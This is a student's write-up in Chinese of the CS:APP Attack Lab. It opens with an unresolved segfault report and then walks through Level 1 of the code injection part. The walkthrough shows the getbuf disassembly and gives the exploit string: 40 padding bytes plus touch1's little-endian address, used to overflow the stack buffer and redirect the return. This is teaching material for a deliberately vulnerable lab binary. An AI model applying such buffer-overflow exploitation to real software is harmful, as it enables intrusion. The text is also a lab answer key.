# Attacklab

## 实验过程中出现的问题（未解决）

在我的虚拟机上运行ctarget时在未开始提示输入内容时就会报段错误，用gdb调试时显示内容如下：

```
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x59b997fa

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7c750d0 in __vfprintf_internal (s=0x7ffff7e1a780 <_IO_2_1_stdout_>, format=0x4032b4 "Type string:", ap=ap@entry=0x5561dbd8, mode_flags=mode_flags@entry=2) at ./stdio-common/vfprintf-internal.c:1244
1244    ./stdio-common/vfprintf-internal.c: No such file or directory.
```

Ubuntu系统安装文件为ubuntu-22.04.3-desktop-amd64.iso。系统版本Linux version 6.2.0-39-generic (buildd@lcy02-amd64-045) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #40~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Nov 16 10:53:04 UTC 2

在做这个实验时是在网上找的别人做好的docker，在上面运行。只有ctarget出现这个问题，rtarget没有。

****

# Part 1 :Code Injection Attacks

此部分实验目标This program is set up in a 
way that the stack positions will be consistent from one run to the next and so that data on the 
stack can be treated as executable code. These features make the program vulnerable to 
attacks where the exploit strings contain the byte encodings of executable code.

## Level1

level1的目标是不注入新代码，将程序重定向到现有过程。test函数会调用getbuf()函数，类似于gets()函数，不够安全，会从标准输入中读取字符串以换行符或是EOF结尾，此函数将读取内容读到一个数组中，并且并未进行边界检验，所以可能会造成栈溢出。

第一关的要求在于令getbuf()函数在返回时不返回test而是转到touch1函数。用gdb调试程序，查看getbuf函数的汇编码。

```asmatmel
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
```

可以看到在栈上分配了0x28即40字节的空间，则test函数的返回地址存放在最上面，所以输入字符串应该覆盖掉这40个字节的空间，然后用目标地址覆盖掉储存的返回地址。反汇编touch1函数，得到touch1的起始地址为`0x00000000004017c0`。现在应该构建攻击字符串。

实验中提供了一个工具hex2raw，它用来生成攻击字符串，它接受16进制格式的字符串进行输入，每个字节由两个16进制数字表示。传递的每2个16进制数之间应该用空格隔开，对于不同部分可以用换行符分开。所以输入的格式应该类似于“52 48 65 25 14”。因为读取的是字符，所以会在栈上储存的是其字符对应的Ascii码编码。hex3raw作用是生成anscii编码是你输入2个16进制数的字符，用来保证覆盖的返回地址是正确字节形式。需要输入40个占位字节，所以先输入40个“11”，然后输入touch1的地址，因为机器为小段存储，所以地址从最低位开始输入，即“c0 17 40 00 00 00 00 00”注意64位系统的地址总共64位，应该在地址前面填00补齐位数(在这关可以不用，因为覆盖的位置原本存放的是返回地址，前面本来就是0)。所以应该答案可以为：

```
11 11 11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11 11 11 
c0 17 40 00 00 00 00 00
```


